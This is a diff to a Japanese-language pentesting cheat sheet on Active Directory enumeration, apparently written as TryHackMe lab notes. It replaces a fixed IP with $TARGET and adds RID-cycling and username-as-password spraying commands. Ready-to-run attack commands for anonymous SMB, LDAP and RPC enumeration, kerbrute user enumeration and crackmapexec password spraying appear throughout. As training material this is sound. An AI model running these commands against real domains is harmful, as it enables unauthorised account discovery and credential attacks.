@@ -33,6 +33,9 @@ smbclient //10.211.11.10/SharedFiles -N
 
 # 多彩な情報
 enum4linux -a TARGET_IP > enum4linux.txt
+
+# RIDサイクリングによるユーザー名列挙
+msfconsole -q -x "use scanner/smb/smb_lookupsid; set rhosts $TARGET; set SMBUser Guest; set SMBPass ''; set THREADS 10; run; exit;"
 ```
 
 ### ドメイン列挙
@@ -42,12 +45,12 @@ enum4linux -a TARGET_IP > enum4linux.txt
 # -x: シンプルな認証。この場合は匿名認証。
 # -H: LDAP サーバーを指定。
 # -s: クエリを基本オブジェクトのみに制限し、サブツリーや子オブジェクトは検索しない。
-ldapsearch -x -H ldap://10.211.11.10 -s base
+ldapsearch -x -H ldap://$TARGET -s base
 ```
 
 ```sh
 # ユーザー情報照会
-ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
+ldapsearch -x -H ldap://$TARGET -b "dc=tryhackme,dc=loc" "(objectClass=person)"
 ```
 
 ```sh
@@ -62,12 +65,12 @@ ldapsearch -x -H ldap://$TARGET -b "cn=admin,dc=eu-west-1,dc=compute,dc=internal
 
 ```sh
 # 可能な限り多くの情報を取得
-enum4linux-ng -A 10.211.11.10 -oA results.txt
+enum4linux-ng -A $TARGET -oA results.txt
 ```
 
 ```sh
 # RPC列挙（Nullセッション）
-rpcclient -U "" 10.211.11.10 -N
+rpcclient -U "" $TARGET -N
 
 > enumdomusers
 > help
@@ -75,7 +78,7 @@ rpcclient -U "" 10.211.11.10 -N
 
 ```sh
 # RIDサイクリング
-for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
+for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N $TARGET 2>/dev/null | grep -i "User Name"; done
 ```
 
 ```sh
@@ -85,7 +88,7 @@ enum4linux -R 1000-1003 $TARGET
 
 ```sh
 # Kerbruteによるユーザー名の列挙（有効なユーザー名かどうか表示される）
-kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
+kerbrute userenum --dc $TARGET -d tryhackme.loc users.txt
 ```
 
 https://github.com/ropnop/kerbrute/releases
@@ -94,18 +97,23 @@ https://github.com/ropnop/kerbrute/releases
 
 ```sh
 # パスワードポリシーの照会
-rpcclient -U "" 10.211.11.10 -N
+rpcclient -U "" $TARGET -N
 rpcclient $> getdompwinfo
 ```
 
 ```sh
 # パスワードポリシーの照会
-crackmapexec smb 10.211.11.10 --pass-pol
+crackmapexec smb $TARGET --pass-pol
 ```
 
 ```sh
 # パスワードスプレー攻撃
-crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
+crackmapexec smb $TARGET -u users.txt -p passwords.txt
+```
+
+```sh
+# ユーザー名=パスワードのパターンを検出
+crackmapexec smb $TARGET -u ./names.txt -p ./names.txt --no-bruteforce 
 ```
 
 ## 認証ありの列挙
